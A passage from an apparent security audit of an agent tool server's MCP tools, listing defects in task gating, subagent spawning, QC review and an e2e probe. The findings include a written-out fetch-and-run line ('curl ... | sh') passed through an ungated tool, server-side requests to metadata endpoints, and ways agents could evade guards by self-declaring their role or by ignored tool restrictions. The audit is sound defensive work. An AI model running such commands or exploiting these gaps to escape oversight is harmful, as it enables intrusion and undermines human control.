  ctx.agent_role.is_some()` (`:133`). Natively `agent_role` is hardcoded `None`
  (`agent/tool_executor.rs:84,247,311`) → gate never runs in PA mode. Over MCP,
  `agent_role` comes from the caller's `__agent_role`
  (`mcp_server/tool_adapter.rs:180-182`) → **the guarded party decides whether the
  guard applies**. Omit one optional field and the build gate disappears.
- **G10-33 (HIGH, CONFIRMED) — the same gate hard-blocks honest callers who omit a
  *different* optional field.** The evidence lookup keys on `ctx.session_id`
  (`:141`). When `__session_id` is absent the adapter mints a **fresh synthetic uuid
  per call** (`tool_adapter.rs:204-219`), so the `bash` that ran the build and the
  `update_task_status` that follows are recorded under two different sessions;
  `most_recent_build` returns `None` and the transition is refused with "Cannot move
  task to qc_review without recorded build evidence" no matter how many builds ran.
  The two failure modes are complementary: omit `__agent_role` → no gate at all;
  omit `__session_id` → the gate can never be satisfied.
- **G10-34 (MEDIUM, CONFIRMED) — every status update silently erases
  `rejection_reason`.** `db/tasks.rs:554-565` always includes `rejection_reason = ?`
  in the `UPDATE`, so a worker calling `update_task_status(id, "in_progress")` after
  a QC rejection writes `NULL` over the reason it was supposed to act on. The
  rejection text is also the only place QC feedback is persisted.
- **G10-35 (MEDIUM, CONFIRMED)** — `status` is passed to SQL unvalidated (`:176`).
  The schema enum is the only enforcement, and schema enums are model-side hints,
  not server-side validation. `status:"Done"` (capital D) writes a status no filter
  matches, and the task vanishes from every board view.

---

#### `assign_task` — `assign_task.rs`

**Schema** `{id (int), worker_slug (enum = `FLEET_WORKERS`)}` both required.
**Body**: validates the slug against `VALID_WORKERS = FLEET_WORKERS`
(`assign_task.rs:28`), refuses non-dispatchable states (only
`ready|assigned|failed|rejected`), `db.update_status`, records routing history,
kicks the worker, fires hooks.

**Description quality — good, and it hardcodes the worker list into the prose**
("Valid workers: worker-backend, worker-frontend, worker-platform, worker-mcp,
worker-cleanup"). The schema enum is generated from the constant, but the prose is a
literal copy — **G10-36 (LOW, CONFIRMED)**: adding a sixth worker to `FLEET_WORKERS`
updates the enum and leaves the description lying, which is the exact drift the K.9
comment says it fixed for the enum.

No functional defects found. This is the best-behaved write tool in the tree.

---

#### `assign_tasks` — `assign_tasks_batch.rs`

**Schema** `{assignments: [{task_id:int, worker_slug:enum}] (minItems 1)}`.
**Body**: per-entry validation with independent failures, deduped worker kicks,
per-entry result list, aggregate counts.

**Description quality — good** and unusually honest about partial failure
semantics. One unverifiable claim: "**one batch call is ~10× faster than N
sequential calls**" — the body opens the DB once and loops, so the saving is real but
the number is invented; no benchmark exists in the tree.

**Defects**
- **G10-37 (LOW, CONFIRMED)** — no cap on `assignments.len()`; a 5 000-entry batch
  runs 5 000 sequential `get_by_id` + `update_status` round-trips inside one tool
  call with no timeout.
- Not declared in `autodev_mcp_config.yaml` (G10-03).

---

#### `claim_task` — `claim_task_tool.rs`

**Schema** `{task_id: integer}` required.
**Body** (`:40-119`): requires the task to be exactly `assigned`, resolves the worker
slug preferring `task.assigned_worker` over `ctx.agent_role`, records
`pid = std::process::id()`, calls `db.claim_task_with_pid` (which also enforces
one-in-progress-task-per-worker, `db/tasks.rs:873-901`), emits a UI event.

**Description quality — states the exact opposite of what happens.**
"records this process's PID for orphan detection… it **enables automatic recovery if
the worker process exits unexpectedly**."

**Defects**
- **G10-38 (HIGH, CONFIRMED) — recording the PID makes orphan recovery strictly
  worse than not recording it.** `std::process::id()` (`:94`) is the **AutoDev Tauri
  app's own PID**, not the worker's: in Mode 2 the worker is a LivingAgent inside the
  separate core-orchestrator process and reaches this code through MCP. The orphan
  reconciler (`orphan/mod.rs:148-190`) branches on `claimed_by_pid`: if the PID is
  alive **and** its process name contains "autodev" it returns `None` — "still our
  worker" — and **never falls through to the 4-hour TTL**. Since the recorded PID is
  the app itself, that branch is true for as long as AutoDev runs. *Scenario:* a
  worker LivingAgent crashes mid-task; the task stays `in_progress` forever; the TTL
  that would have released it after 4 hours is skipped **because** a PID was
  recorded. A task claimed the old way (`update_task_status(in_progress)`, no PID)
  *does* get released. The tool that exists to improve recovery disables it.
- **G10-39 (LOW, CONFIRMED)** — `claim_host` is recorded from the app's hostname for
  the same reason, so the multi-machine guard at `orphan/mod.rs:157-163` also
  reasons about the wrong host.

---

#### `set_task_budget` — `set_task_budget_tool.rs`

**Schema** `{task_id (int, required), max_tokens?: int, max_usd?: number,
max_turns?: int}`.
**Body**: `budget::validate_budget`, `db.set_task_budget(task_id, Option, Option,
Option)`, then computes `effective_*` by `unwrap_or(100_000 / 0.50 / 20)` and reports
those numbers.

**Description quality — contradicts both the schema and the body.**
Description: "**Omit a field to leave it unlimited**." Schema: "Default: 100,000 /
$0.50 / 20". Body: stores `None` but *reports* `100000 / $0.50 / 20` as the budget it
set. Three different answers to "what happens when I omit max_usd?".

**Defects**
- **G10-40 (MEDIUM, CONFIRMED)** — the success message asserts a budget that was
  never written. `db.set_task_budget` receives `None`; whether `NULL` means
  "unlimited" or "engine default" is decided elsewhere, but the tool result tells the
  Supervisor the task is capped at $0.50 regardless.
- **T40 (given)** — the stored budget only takes effect if the runner calls
  `with_task_budget()`.

---

#### `create_epic` — `create_epic_tool.rs`  ·  `create_phased_task` — `create_phased_task_tool.rs`

**`create_epic`** `{title (required, ≤120 bytes), description?}` → creates the parent
row with `created_by = ctx.session_id` (a uuid, not a worker name) and returns
`{"epic_id": <number>, …}` (`create_epic_tool.rs:73`).

**`create_phased_task`** `{epic_id: **string**, phase, phase_order, title, priority,
task_type, acceptance_criteria}` (7 required) — and the body does
`input["epic_id"].as_str()` (`:79`) then `.parse::<i64>()` (`:119`).

**Defects**
- **G10-41 (HIGH, CONFIRMED) — the documented two-step workflow fails on the first
  attempt.** `create_epic` hands back `epic_id` as a JSON **number** and instructs
  "Now call create_phased_task with epic_id=N" (`:77`); `create_phased_task` requires
  a **string** and rejects a number outright ("'epic_id' is required"). The same
  string-typed `epic_id` appears in `get_epic_progress` and
  `get_ready_tasks_in_phase`. A model that echoes back the id it was just given gets
  an error whose text does not mention the type problem.
- **G10-42 (MEDIUM, CONFIRMED)** — neither tool is exposed to fleet workers
  (`register_for_mcp_worker` omits both), while `get_epic_progress` /
  `get_ready_tasks_in_phase` are. A Supervisor running in Mode 2 — the primary
  execution mode — can *read* epic progress but cannot *create* an epic, so the whole
  Ruflo Feature 5 decomposition flow is unreachable from the fleet.
- **G10-43 (LOW, CONFIRMED)** — `create_epic`'s "The epic auto-completes when all its
  subtasks reach status=done" is a claim about machinery outside this tool; nothing
  in `create_epic_tool.rs` establishes it.

---

#### `get_epic_progress` · `get_ready_tasks_in_phase`

Read-only wrappers over `db.get_phase_summary` / `db.get_ready_tasks_in_phase`. Both
take `epic_id` as a string (see G10-41). Both validate non-empty input and surface
DB errors verbatim. `get_ready_tasks_in_phase` has no result cap, but the natural
cardinality is small. No further defects found.

---

#### `suggest_worker` — `suggest_worker_tool.rs`

`{task_id: integer}` → `TaskRouter::suggest_worker(&task)`, enriched with
`primary_repos` from `WorkersDb`. `is_read_only()=true`, correct. Description
accurately names the return fields and the three methods. **No defects found** —
this and `get_task` are the two cleanest tools in the audit.

---

### 2.4 Fleet coordination

---

#### `request_supervisor_action` — `request_supervisor_action.rs`

**Schema** `{request_type (enum of 5, required), payload (object, required),
task_id?: integer}`.
**Body** (`:63-140`): validates `request_type` against the enum *in code* (one of the
few tools that does), requires `payload` to be a JSON **object** (any shape),
resolves the requesting worker as `task.assigned_worker` → `ctx.agent_role` →
`"unknown"`, inserts into `worker_requests`, kicks the supervisor, emits a UI event.

**Description quality — adequate.** It says "The Supervisor polls these requests
every tick and acts on them", which is true only if the supervisor recipe is
scheduled; the tool does not check.

**Defects**
- **G10-44 (MEDIUM, CONFIRMED) — escalations are attributed to the wrong worker.**
  Identity resolution prefers `task.assigned_worker` over the caller
  (`:98-107`). A `worker-frontend` escalating about task #42, which is assigned to
  `worker-backend`, files a request recorded as coming from `worker-backend`. The
  Supervisor then replies to the wrong agent. The comment justifies the order
  ("authoritative — assign_task wrote it") but conflates *who owns the task* with
  *who is talking*.
- **G10-45 (LOW, CONFIRMED)** — `payload` is a free-form object. The description
  documents five different payload shapes; nothing validates any of them, so a
  malformed `decompose_audit` payload is only discovered by the Supervisor's LLM.

---

#### `list_worker_requests` — `list_worker_requests_tool.rs`

`{status?: enum(4)}`, read-only, returns every matching request **including the full
`payload`**. No cap. A `decompose_audit` payload carries whole task arrays, so a
supervisor tick that drains 20 requests can pull a very large blob into context.
**G10-46 (LOW, CONFIRMED)** — no `limit`, and the `status` filter is not validated
(an unknown status returns zero rows, indistinguishable from an empty queue).

---

#### `resolve_worker_request` — `resolve_worker_request_tool.rs`

`{id (int, required), action (enum: completed|acknowledged|rejected, required),
note?}`. `action` **is** validated in code (`:57-63`).

**Defects**
- **G10-47 (HIGH, CONFIRMED) — returns success when it resolved nothing.**
  `db.update_worker_request_status` (`db/tasks.rs:668-686`) executes the `UPDATE` and
  discards the affected-row count. `resolve_worker_request(id=999999, action="completed")`
  returns `"Worker request #999999 marked as completed."` with `is_error=false`.
  *Scenario:* the Supervisor mis-reads an id, resolves nothing, believes the queue is
  drained, and the real request stays `pending` forever — while the tool's own
  description warns that unresolved requests are re-processed every tick. The
  neighbouring `acknowledge_worker_message` (`db/tasks.rs:781-793`) **does** check
  `rows == 0` and errors, so the correct pattern exists in the same file.

---

#### `send_worker_message` — `send_worker_message.rs`

**Schema** `{to (string, required), body (string, required), kind?: enum(5),
task_id?: int}`.
**Body**: recipient validated against `FLEET_WORKERS + supervisor|qc-agent|qc-dispatcher|*`;
`body` ≤ 4096 **bytes**; `kind` validated; sender = `ctx.agent_role` or **refuse**;
self-send refused; `*` broadcast restricted to `from == "supervisor"`; N inserts for
broadcast; per-target `scheduler::kick`; UI event per message.

**Description quality — good**, with clear "NOT for" guidance. It does not say the
tool is unusable without `__agent_role`.

**Defects**
- **T49 (given)** — refuses whenever `ctx.agent_role` is `None`, which is *always*
  natively. Combined with the registration comment at `mod.rs:230-231` ("ACP tools
  available in PA so Razi can manually inspect / send worker messages from the chat
  tab for debugging the fleet"), the stated purpose of the PA registration is
  impossible to fulfil. All three ACP tools are dead weight in PA modes — 3 of the 38
  tool schemas in every PA request buy nothing but tokens.
- **G10-48 (MEDIUM, CONFIRMED) — fleet identity is self-asserted and unauthenticated.**
  `from` comes from `__agent_role` on the MCP call (`tool_adapter.rs:180-182`); the
  server runs with "No auth middleware — localhost-only" (`mcp_server/server.rs`
  comment near the router). Any caller can set `__agent_role: "supervisor"` and
  thereby (a) broadcast to the whole fleet, and (b) satisfy
  `acknowledge_worker_message`'s ownership check for someone else's inbox
  (`acknowledge_worker_message.rs:63-70`), and (c) bypass or trip
  `update_task_status`'s build gate at will. The identity is a claim, not a credential.

---

#### `list_worker_messages` — `list_worker_messages.rs`

`{unread_only?: bool (default true)}`. Requires `agent_role`. Marks returned messages
`pending → read` as a side effect, which is why `is_read_only()` returns **false**
with an unusually thorough comment (`:46-55`).

**Defects** — **T49**, **T56** (given). Plus **G10-49 (LOW, CONFIRMED)**: no cap on
inbox size; `unread_only=false` returns the entire message history for that slug,
each up to 4 KB.

---

#### `acknowledge_worker_message` — `acknowledge_worker_message.rs`

`{id (int, required)}`. Requires `agent_role`, fetches the message, refuses if
`msg.to_slug != caller`, then `db.acknowledge_worker_message` which **does** check
rows-affected. Correct within its trust model; the trust model is G10-48.

---

#### `spawn_subagent` — `spawn_subagent.rs`

**Schema** `{task_description (required), system_prompt?, tools?: string[], model?,
task_context?, max_turns?, timeout_secs?}`.
**Body** (`:73-186`): depth guard `ctx.depth >= 3`; fetch global `SubagentManager`;
build a system prompt; build `SubagentConfig`; `mgr.spawn` then
`mgr.await_result` — the parent blocks; failure/termination is returned as
`is_error`.

**Description quality — promises a containment feature that does not exist.**
"Use for tasks that … **(c) should run with a restricted tool subset**", and the
`tools` parameter says "Tool subset (e.g. ["read_file", "grep"]). Empty = MCP tools
only."

**Defects**
- **G10-50 (HIGH, CONFIRMED) — the `tools` restriction is accepted and ignored.**
  `SubagentConfig.tools` is written at `spawn_subagent.rs:129-134`,
  `spawn_parallel_subagents.rs`, and `commands/subagent_commands.rs:52`, and is
  **read nowhere** — `grep -rn "\.tools" src/subagent/` returns only the struct
  definition (`subagent/types.rs:31`). `bridge.rs` and `manager.rs` never consult it.
  Every subagent therefore gets the full MCP surface — all 34 tools including `bash`,
  `write_file`, `edit_file`, `e2e_probe`. *Scenario:* a parent spawns an "analysis
  only" subagent with `tools:["read_file","grep"]`, the subagent decides the fix is
  obvious, and writes to the repo. The parent had every reason to believe that was
  impossible.
- **G10-51 (MEDIUM, CONFIRMED) — `system_prompt` is silently discarded when
  `task_context` is also supplied.** The match at `:87-89` is `(Some(task_ctx), _)`,
  so a caller passing both gets the generic three-line prompt and never learns its
  custom prompt was dropped.
- **G10-52 (MEDIUM, CONFIRMED) — the per-parent fan-out cap cannot bind over MCP.**
  `parent_slug: ctx.session_id` (`:125`). When the MCP caller omits `__session_id`,
  the adapter mints a **fresh uuid per call** (`tool_adapter.rs:204-219`), so every
  spawn reports a different parent and `MAX_PER_PARENT` (10) is never reached. Only
  the global cap remains. Same root cause as G10-33.
- **T48 (given)** — the depth guard is inert natively (`ctx.depth` hardcoded 0 at
  `tool_executor.rs:84,247,311`); over MCP it works only if the caller forwards
  `__depth`, i.e. the guarded party again decides whether the guard applies.
- Not a defect: `max_turns`/`timeout_secs` default to `0` here but `manager.rs:80-88`
  normalises `0 → DEFAULT_MAX_TURNS / DEFAULT_TIMEOUT_SECS` and empty `mcp_servers →
  DEFAULT_MCP_SERVER`. Verified.

---

#### `spawn_parallel_subagents` — `spawn_parallel_subagents.rs`

**Schema** `{subtasks: [{task_description, …}] (minItems 1, maxItems 10),
max_concurrent?: int (default 5), aggregate_results?: bool}`.
**Body**: same depth guard, batches of `max_concurrent`, awaits each window.

**Description quality — off by one at the boundary.** "Spawn **2**-10 subagents"
while the schema is `minItems: 1` and the body accepts 1 (`:75-78`).

**Defects** — inherits **G10-50** (per-subtask `tools` also ignored), **G10-52**,
**T48**. Plus **G10-53 (LOW, CONFIRMED)**: `max_concurrent` is unvalidated above 1
(`.max(1)` only), so `max_concurrent: 10` defeats the windowing entirely and relies
solely on the pool's hard caps.

---

### 2.5 Memory

---

#### `search_memory` — `search_memory.rs`

`{query (required), limit?: int (default 10, clamped to 30 at `:60`), tier?: enum}`.
Calls `memory::recall::search_all` with `session_id` + `working_dir` from context.
Clean: the limit clamp is enforced in code, not just in the schema, and an empty
result returns a well-formed "no entries" payload rather than an error.
**No defects found.** Not exposed to fleet workers (matrix §1.2) — the
`mcp_server/server.rs` comment justifies this as "workers access memory via
mcp-memory server directly", which is a different store with a different schema.

---

#### `remember_this` — `remember_this.rs`

`{fact (required), category?: enum(5), tags?: string[]}` → `SemanticStore::store_fact`
with confidence 1.0 and source `"user_explicit"`.

**Defects**
- **G10-54 (HIGH, CONFIRMED) — UTF-8 panic on the success message.**
  `remember_this.rs:94`: `let display = if fact.len() > 120 { &fact[..120] } else { &fact };`
  — `fact.len()` is bytes and `&fact[..120]` is a raw byte slice. Any fact longer
  than 120 bytes whose 120th byte falls inside a multi-byte character panics the
  task. A user asking the agent to remember a sentence containing an em-dash,
  a curly quote, an accented name, or any CJK/emoji text at that offset is enough.
  Same defect class as T18 (`bash`) and T20 (`path_jail`); the fix pattern already
  exists in the same crate (`validate.rs:840-846` uses `char_indices`).
- **G10-55 (LOW, CONFIRMED)** — the description asserts "Stored facts appear in
  **every** future system prompt". Facts reach the prompt only through
  `crate::memory::build_memory_context`, which `agent/context.rs:115-119` calls
  **only when a `session_id` was attached via `with_session()`**. In any code path
  that builds context without a session the claim is false, and the model has been
  told its write is durable and always visible.
- `category` is not validated against the enum; `FactCategory::from_str` decides what
  an unknown string becomes (`:70-72`).

---

### 2.6 Graph

---

#### `graph_tools.rs` (≈840 lines, 5 tools) · `graph_prompts.rs` (78 lines)

**Not compiled.** Neither module appears in the `pub mod` list at `mod.rs:6-72`, so
`graph_query`, `graph_impact_radius`, `graph_god_nodes`, `graph_entry_points` and
`graph_diff` do not exist in the binary, are absent from every registry, and cannot
be called by any consumer. G2a **T32/G-1** owns this finding; this audit confirms it
independently from the `mod.rs` side and adds one registration consequence:
`mcp_server/server.rs:149` lists `graph_tools / graph_prompts` under "NOT exposed
(intentional)" with the rationale "use GraphStore API, not Tool trait; PA-only
analysis" — which describes a deliberate exclusion, not a compilation gap, and so
actively conceals the bug from anyone reading the registration code.

---
### 2.7 QC / verification tools

---

#### `analyze_diff` — `analyze_diff_tool.rs`

**Schema** `{repo_path, base_branch, head_branch (all required), task_id?: integer}`.
**Body** (`:57-151`): validates the three strings are non-empty → `build_analyzer_from_vault`
(`:214-240`) → `generate_branch_diff_pub` → `analyzer.analyze(&patch).await` (**an LLM
call**) → serialise → bolt on `interface_drift` (`:114`) → optionally
`db.set_task_diff_analysis` + `emit_task_changed_global` (`:127-146`) →
`success_with_hint(json, summary)`.

**Description quality — omits the two facts that matter most.** It describes the
return shape accurately and says nothing about (a) the tool making a **billed LLM
call to a third-party provider** on every invocation, or (b) `repo_path` being an
unrestricted absolute path. A model told only "analyze a git diff and get a risk
score" has no reason to treat this as an expensive or sensitive operation.

**Defects**
- **G10-56 (HIGH, CONFIRMED) — `is_read_only()` is `true` (`:55`) but the tool
  writes to the database and emits a UI event.** `:129` calls
  `db.set_task_diff_analysis(task_id, &json)` and `:136` pushes
  `emit_task_changed_global`. Two consequences beyond the mislabel: read-only tools
  are auto-approved (§3.4), and `tool_adapter.rs:253` skips the per-path lock for
  read-only tools. A tool that mutates `tasks.diff_analysis` is running with the
  gating of a `grep`.
- **G10-57 (HIGH, CONFIRMED) — unrestricted `repo_path` on an auto-approved tool
  that ships the result to a third-party LLM.** There is no `path_jail` call and no
  containment of any kind: `repo_path` is handed straight to
  `git2::Repository::open` (`commands/diff_commands.rs:75`). `analyze_diff(repo_path=
  "C:/Users/<u>/work/private-client-repo", base_branch="main", head_branch="HEAD")`
  produces a full unified patch of a repository that has nothing to do with the
  workspace, and `:87` sends that patch to Anthropic/OpenAI/Google as prompt
  content. This is the only tool in the tree that exfiltrates arbitrary on-disk
  content to a network endpoint, and it is marked read-only.
  *Mitigation actually present:* the diff is generated through **libgit2**, not a
  shelled-out `git` (`commands/diff_commands.rs:74-98`) — so `base_branch` /
  `head_branch` are not a command-injection vector. That part is correct.
- **G10-58 (MEDIUM, CONFIRMED) — the provider and model are read from process
  environment variables, not from the app's configured provider.**
  `build_analyzer_from_vault:219-222` reads `AUTODEV_ACTIVE_PROVIDER` /
  `AUTODEV_ACTIVE_MODEL` and falls back to hardcoded `"anthropic"` /
  `"claude-sonnet-4-6"`. The comment at `:217-218` admits it is guessing ("Read
  active provider settings from a simple config file (same pattern as sidecar) /
  Fallback: use vault to check which provider has a key") and no such config read
  is implemented. *Failure:* the user selects Ollama in Settings to avoid API
  spend; every `analyze_diff` still pulls the Anthropic key out of the vault and
  bills them. If no Anthropic key is present the tool hard-errors with "No API key
  for provider 'anthropic'" while the app is demonstrably configured with a working
  provider.
- **G10-59 (LOW, CONFIRMED) — `detect_interface_drift` matches diff markers inside
  diff *content*.** The regex `(?m)^(?:\+\+\+ b/|--- a/)(.+)$` (`:178`) is applied
  to the patch text. A commit that edits a `.patch`/`.diff` fixture, or a markdown
  doc containing a fenced diff block, produces added lines rendered as
  `+++ b/whatever` (one `+` for the add, two from the content) — which the regex
  matches as a real file marker. The drift status is then computed from files that
  were never touched.
- **G10-60 (LOW, CONFIRMED) — the frontend-consumer heuristic fires on any path
  containing "use".** `:192-196`: `pl.contains("use") && (pl.contains("query") ||
  pl.contains("fetch") || pl.contains("event"))`. Lowercased,
  `src/pages/UserQueryPage.tsx` contains both "use" and "query" and is classified
  as an API consumer. `interface_drift.status` is then `both` / `consumer_only` on
  a diff that touched no consumer.

---

#### `annotate_file` — `annotate_file_tool.rs`

**Schema** `{file_path, start_line, end_line, note, severity}` — all five required,
`additionalProperties: false` (one of only two tools that close the schema).
**Body** (`:57-105`): validates `start_line >= 1`, `end_line >= start_line`,
non-empty `note`; `severity` is read with `unwrap_or("info")`; `source` is derived
from `ctx.agent_role`; `AnnotationsDb::create` with `task_id: None` hardcoded.

**Description quality — accurate about intent, silent about the fact that nothing
is verified.** It says the note "appears as a gutter decoration … so the user can
see exactly which lines triggered a QC finding". Nothing checks that the file
exists, that it is in the workspace, or that the line range is inside the file.

**Defects**
- **G10-61 (HIGH, CONFIRMED) — UTF-8 boundary panic on the success message.**
  `annotate_file_tool.rs:99`: `if note.len() > 80 { &note[..80] } else { &note }`.
  `note.len()` is **bytes**; `&note[..80]` is a raw byte slice. Any note longer
  than 80 bytes whose 80th byte lands inside a multi-byte character panics the
  task. This is the third instance of the identical bug — `bash.rs:134-141` (T18),
  `remember_this.rs:94` (G10-54), and here — and it is the *most* reachable of the
  three, because QC review notes are LLM-written prose and 80 bytes is a very short
  leash. A single em-dash, curly quote, `→`, `✓`, or accented name near character
  80 is enough. `validate.rs:846-853` shows the correct `char_indices` pattern in
  the same crate.
- **G10-62 (HIGH, CONFIRMED) — `annotate_file` gets neither the path jail nor
  either path lock, because its path argument is called `file_path`.** It does not
  call `validate_workspace_path` (§2.8), so `file_path` may be any string at all —
  absolute, outside the workspace, or a path that does not exist. And
  `tool_adapter.rs:44-46` (`extract_path_arg`) looks up the key `"path"`, so this
  non-read-only, file-addressed tool also gets **no adapter-level path lock**. The
  annotation is written against an uninterpreted string that the IDE viewer later
  has to resolve.
- **G10-63 (MEDIUM, CONFIRMED) — annotations are never linked to a task.**
  `create_input.task_id` is hardcoded `None` (`:91`) even though
  `CreateAnnotationInput` carries the field and the tool's stated purpose is to
  "attach rejection reasons directly to the code" for a QC task. Nothing can
  correlate an annotation with the review that produced it, so a rejected task's
  findings cannot be listed, cleared on re-review, or aged out.
- **G10-64 (MEDIUM, CONFIRMED) — `severity` is schema-only.** `:74` takes any
  string via `unwrap_or("info")` with no check against the `info|warning|blocking`
  enum. `severity: "BLOCKING"` (capitalised) or `"critical"` writes straight
  through to the DB, and the gutter renderer's severity styling has no case to
  match.
- **G10-65 (LOW, CONFIRMED) — `source` is misattributed in PA mode.** `:77-81`
  derives the source from `ctx.agent_role`, which is hardcoded `None` at all three
  native construction sites (`tool_executor.rs:84,247,311`), so every PA-mode
  annotation is recorded as `source: "user"` — the user appears to have written
  notes the agent wrote.
- **G10-66 (LOW, CONFIRMED)** — no bound on `note` length (the schema says "max 500
  chars recommended" and nothing enforces it), and no check that `end_line` is
  within the file, so a range of `1..2000000` is accepted and rendered.

---

#### `spawn_qc_review` — `spawn_qc_review.rs`

**Schema** `{task_id (int, required), repo_path?, model?, timeout_secs?}`.
**Body** (`:68-288`): positive-id check → depth guard (`:76`) → fetch
`SubagentManager` → **cost guard** `check_and_record_dispatch_intent` (`:95`) →
open DB, load task, require `status == "qc_review"` and `under_review_by == None`
→ `try_claim_for_qc_review` with a synthetic token → build the reviewer prompt →
`mgr.spawn` (does **not** await) → `upgrade_qc_claim` to the real subagent id →
detached `tokio::spawn` that awaits the result, attributes cost, releases the
claim, records analytics → return `{task_id, subagent_id, status, claim_token}`.

**Description quality — states a restriction that nothing enforces.** "Only the
qc-dispatcher recipe should call this; workers must not." The tool is registered in
all 38 PA tools and all 34 MCP-worker tools, there is no caller check, and
`parent_slug` is hardcoded to `QC_DISPATCHER_SLUG` (`:154`) — so a worker that
calls it is not merely permitted, it is **recorded as the dispatcher**.

**Defects**
- **G10-67 (HIGH, CONFIRMED) — every failed dispatch permanently charges the hourly
  cost guard, so repeated failures deadlock QC for an hour at zero real spend.**
  `check_and_record_dispatch_intent` (`:378-391`) pushes a provisional `$0.10`
  entry into the rolling-hour ring **and then returns `None`**, i.e. the charge is
  recorded *before* the eight subsequent error returns: `:102` (DB open), `:108`
  (task not found), `:113` (wrong status), `:119` (already under review), `:133`
  (claim race), `:135` (claim error), `:176` (spawn failed). Only the background
  completion handler calls `record_dispatch_complete` (`:222`, `:258`), and that
  task exists only when `mgr.spawn` succeeded. Every other path leaks $0.10 that is
  never reconciled and expires only after a full hour.
  *Scenario:* the qc-dispatcher recipe ticks once a minute and calls
  `spawn_qc_review` on a task that is already under review — the single most
  ordinary failure in the system. Each tick returns the `:119` error and leaks
  $0.10. After 50 ticks the rolling sum reaches $5.00, the ceiling
  (`CEILING_USD_PER_HOUR`, `:354`) trips, and **every** QC review in the fleet is
  refused for the next hour with "QC cost guard tripped: rolling 1h spend ~$5.00"
  — while actual spend is $0.00. A guard built to stop runaway cost becomes a
  self-inflicted denial of service driven by its own error path. The comment at
  `:91-93` shows the author reasoned about exactly this class of leak for *claim*
  state ("Check the rolling hour QC spend BEFORE claiming the task so a tripped
  guard doesn't leak claim state") and then introduced it for cost.
- **G10-68 (MEDIUM, CONFIRMED) — `record_dispatch_complete` can delete a real cost
  record instead of a provisional one.** `:401` finds the first entry whose cost is
  within `1e-9` of `PROVISIONAL_COST_USD` ($0.10) and removes it. A *realised* QC
  review that happens to cost exactly $0.10 — an entirely plausible sonnet review —
  is indistinguishable, so the pop removes real spend and the ring under-counts
  from then on. The comment ("we simply pop one provisional entry (any one) … over
  a busy window this self-corrects") describes the ambiguity but not this direction
  of the error.
- **G10-69 (MEDIUM, CONFIRMED) — the QC reviewer is spawned with `tools:
  Vec::new()` and therefore receives the full 34-tool MCP surface.** `:157` sets
  the empty tool list with the comment `// MCP-only`; per **G10-50**
  `SubagentConfig.tools` is read nowhere, so the reviewer gets `write_file`,
  `edit_file`, `append_file`, `bash`, and `e2e_probe`. **A QC reviewer can rewrite
  the code it is reviewing and then pass it.** The independence the review exists
  to provide is not enforced anywhere in the spawn path.
- **G10-70 (MEDIUM, CONFIRMED) — the cost ceiling is documented as configurable and
  is a compile-time constant.** The module comment at `:337` says "a configurable
  threshold (default $5)"; `CEILING_USD_PER_HOUR` (`:354`) and
  `PROVISIONAL_COST_USD` (`:358`) are `const` with no settings path, env var, or DB
  key. The comment at `:92-94` additionally claims the guard "reads/writes a
  module-level counter so it's thread-safe and **lock-free**" — it is a
  `Mutex<Vec<Entry>>` (`:362`), i.e. explicitly lock-based.
- **G10-71 (LOW, CONFIRMED)** — `timeout_secs` is `as_u64()` then `as u32`
  (`:148-151`), so `timeout_secs: 4294967296` silently truncates to `0`, which
  `subagent/manager.rs:80-88` then normalises to the default. The model's explicit
  timeout is discarded with no error.
- **G10-72 (LOW, CONFIRMED)** — the detached completion task (`:204`) is the only
  thing that releases `under_review_by`. If the app exits before the reviewer
  terminates, the claim survives in the DB with no in-process owner, and the tool's
  own `:117-122` guard then refuses every future review of that task ("already
  under review by …") until an external reconciler intervenes.
- **T48 (given)** — the depth guard at `:76` is inert natively and self-declared
  over MCP, exactly as in `spawn_subagent`.

---

#### `e2e_probe` — `e2e_probe.rs`

**Schema** `{start_cmds: string[] (required), probe_url (required), expected_text
(required), boot_wait_s?: int, timeout_s?: int}`.
**Body** (`:91-153`): validates the three required fields → `run_probe` under a
single `tokio::time::timeout` → for each `start_cmd` spawn `cmd /C <s>` (Windows)
or `sh -c <s>` with `kill_on_drop(true)` and null stdio, `current_dir(working_dir)`
→ `sleep(boot_wait)` → `reqwest` GET with a 10 s client timeout → `kill().await`
each child → build `ProbeReport`.

**Description quality — accurate about what it does, silent about what it is.** It
never says that `start_cmds` are executed as raw shell one-liners with no
restriction, that `probe_url` may be any URL on any host, or that the tool declares
`requires_permission() = false`. Read literally it sounds like a scoped smoke test;
it is a second, ungated `bash`.

**Defects**
- **G10-73 (CRITICAL, CONFIRMED) — `e2e_probe` is arbitrary command execution with
  every one of `bash`'s safety rails removed, and it explicitly declares
  `requires_permission() = false`.** `:89` sets `requires_permission()` to false
  (`bash` does not override it). Compared with `bash.rs`, `e2e_probe`:
  · does **not** call `validate_workspace_path` on anything (`bash.rs:62` jails its
    cwd);
  · does **not** run `check_redirect_targets` (`bash.rs:75`);
  · does **not** record build evidence;
  · accepts an **array** of commands, so N shells per call;
  · discards stdout and stderr entirely (`Stdio::null()`, `:183-185`), so whatever
    the commands did is unobservable.
  `e2e_probe(start_cmds=["curl -s http://x/y.sh | sh"], probe_url=
  "http://localhost:1", expected_text="x")` executes with the app's privileges and
  returns a benign-looking "HTTP probe error". The module header at `:20-22`
  asserts the opposite — "Composability with the runner.rs path-jail: the probe
  walks `working_dir` to launch its children, so a misconfigured workspace can't
  reach the wrong tree" — but `current_dir()` only sets the starting directory; the
  command string is free to `cd`, use absolute paths, or invoke anything on `PATH`.
  The claimed containment property does not exist.
- **G10-74 (HIGH, CONFIRMED) — `probe_url` is an unvalidated server-side request.**
  `:264` issues a `reqwest` GET to whatever string was supplied — any host reqwest
  will resolve, including link-local metadata endpoints and internal services — and
  `:236` returns the first 400 characters of the response body to the model. On a
  tool declared `requires_permission() = false`. Nothing restricts the host to
  localhost despite every example in the schema being `http://localhost:PORT`.
- **G10-75 (HIGH, CONFIRMED) — on Windows the teardown kills the shell, not the
  server.** Children are spawned as `cmd /C <cmd_str>` (`:180-181`). Killing
  `cmd.exe` — whether via the explicit `kill().await` at `:225` or via
  `kill_on_drop` — does not terminate its grandchildren, so `npm run dev` leaves a
  `node.exe` holding the port after the probe returns. The tool's own error text
  and the module header both promise it "Always tears down its children before
  returning". *Scenario:* three probe runs against a Vite dev server leave three
  orphaned `node.exe` processes; the fourth run's `start_cmds` fails with
  `EADDRINUSE`, the probe reports `FAIL — Body did not contain fingerprint`, and
  the agent concludes the application is broken. Same root-cause class as
  **G10-24** in `bash`.
- **G10-76 (MEDIUM, CONFIRMED) — on the timeout path the explicit teardown never
  runs, but the error message says it did.** `:129` wraps `run_probe` in
